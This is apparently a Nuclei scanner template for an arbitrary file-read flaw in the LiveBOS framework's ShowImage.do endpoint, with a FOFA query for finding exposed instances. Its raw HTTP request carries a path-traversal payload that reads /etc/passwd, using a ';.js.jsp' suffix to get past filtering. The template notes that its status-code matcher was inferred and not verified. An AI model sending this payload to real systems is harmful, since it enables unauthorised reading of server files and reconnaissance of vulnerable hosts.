id: poc-b7582e70fecc8a0b9d29
info:
  name: LiveBOSShowImage.do接口存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b7582e70fecc8a0b9d296782a312720c

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: b7582e70fecc8a0b9d296782a312720c
    fofa: + fofa`app="LiveBOS-框架" && body=" Power by LiveBOS"`
http:
- raw:
  - 'GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0

    Accept: image/avif,image/webp,*/*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Connection: keep-alive'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
